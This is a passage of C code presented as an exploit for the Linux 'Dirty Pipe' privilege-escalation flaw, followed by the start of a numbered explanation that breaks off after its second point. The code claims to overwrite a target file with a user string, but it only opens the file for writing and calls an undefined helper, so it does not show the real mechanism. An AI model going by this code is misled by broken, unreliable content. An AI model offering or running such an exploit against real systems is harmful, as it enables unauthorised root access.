        perror("pipe");
        exit(EXIT_FAILURE);
    }

    // Write the target user to the pipe
    dirty_pipe_write(pipefd[1], target_user, strlen(target_user));

    // Open the target file
    int fd = open(target_file, O_WRONLY);
    if (fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    // Write the target user to the target file
    write(fd, target_user, strlen(target_user));

    // Close the file descriptor
    close(fd);

    // Close the pipe
    close(pipefd[0]);
    close(pipefd[1]);
}

int main() {
    dirty_pipe_exploit();
    return 0;
}
```

### Explanation

1. **Pipe Creation**: The `pipe()` function creates a pipe and returns file descriptors (pipefd[0] and pipefd[1]) that can be used to read from and write to the pipe, respectively.

2. **Writing to the Pipe**: The `dirty_pipe_write()` function writes the target user to the pipe. This simulates the data that is written to the pipe.
